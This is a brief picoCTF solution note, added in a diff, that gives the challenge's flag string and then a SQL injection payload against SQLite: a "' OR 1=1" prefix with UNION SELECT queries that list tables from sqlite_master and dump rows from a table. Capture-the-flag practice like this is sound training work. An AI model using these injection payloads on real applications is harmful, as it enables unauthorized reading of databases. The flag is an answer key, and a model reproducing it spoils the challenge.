@@ -1,0 +1,12 @@
+	picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}
+
+
+Steps Followed:
+
+' OR 1=1
+Union
+SELECT tbl_name as city, tbl_name as address, tbl_name as phone  FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
+UNION 
+select cast(count(*) as text), cast(count(*) as text), cast(count(*) as text) from more_table 
+UNION 
+select *, cast(count(*) as text) as phone from more_table --
